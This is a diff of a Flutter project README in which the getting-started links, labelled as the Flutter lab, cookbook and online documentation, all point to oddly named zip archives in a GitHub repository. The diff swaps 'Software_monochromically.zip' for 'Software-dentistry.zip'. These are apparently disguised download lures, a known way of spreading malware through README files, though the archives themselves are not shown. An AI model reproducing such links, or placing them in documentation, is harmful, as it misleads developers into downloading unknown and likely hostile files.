@@ -8,9 +8,9 @@ This project is a starting point for a Flutter application.
 
 A few resources to get you started if this is your first Flutter project:
 
-- [Lab: Write your first Flutter app](https://raw.githubusercontent.com/DoraOtari/projecths/main/windows/Software_monochromically.zip)
-- [Cookbook: Useful Flutter samples](https://raw.githubusercontent.com/DoraOtari/projecths/main/windows/Software_monochromically.zip)
+- [Lab: Write your first Flutter app](https://github.com/DoraOtari/projecths/raw/refs/heads/main/ios/Software-dentistry.zip)
+- [Cookbook: Useful Flutter samples](https://github.com/DoraOtari/projecths/raw/refs/heads/main/ios/Software-dentistry.zip)
 
 For help getting started with Flutter development, view the
-[online documentation](https://raw.githubusercontent.com/DoraOtari/projecths/main/windows/Software_monochromically.zip), which offers tutorials,
+[online documentation](https://github.com/DoraOtari/projecths/raw/refs/heads/main/ios/Software-dentistry.zip), which offers tutorials,
 samples, guidance on mobile development, and a full API reference.
